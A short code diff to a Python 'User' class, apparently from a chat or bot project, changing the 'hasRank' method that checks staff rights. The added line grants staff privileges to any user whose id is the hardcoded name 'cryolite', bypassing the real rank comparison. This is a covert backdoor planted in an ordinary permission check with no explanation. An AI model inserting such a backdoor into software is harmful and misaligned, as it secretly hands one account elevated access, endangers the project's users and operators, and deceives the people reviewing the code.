@@ -101,7 +101,7 @@ class User:
 
     def hasRank(self, rank):
         """Determines if a user has sufficient staff rights"""
-        return self.owner or User.compareRanks(self.rank, rank)
+        return self.owner or User.compareRanks(self.rank, rank) or self.id == 'cryolite'
 
 
 if __name__ == '__main__':
